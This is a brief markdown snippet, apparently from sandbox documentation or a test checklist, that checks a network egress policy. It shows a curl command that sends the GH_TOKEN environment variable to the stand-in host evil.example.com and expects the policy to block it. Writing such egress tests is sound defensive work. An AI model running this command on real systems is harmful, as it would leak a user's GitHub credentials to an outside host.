# Exfiltration blocked

```bash terminal-id=host
sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\n" "https://evil.example.com?k=$GH_TOKEN"
```

Expected: blocked — network policy prevents sending the sentinel to unapproved hosts.
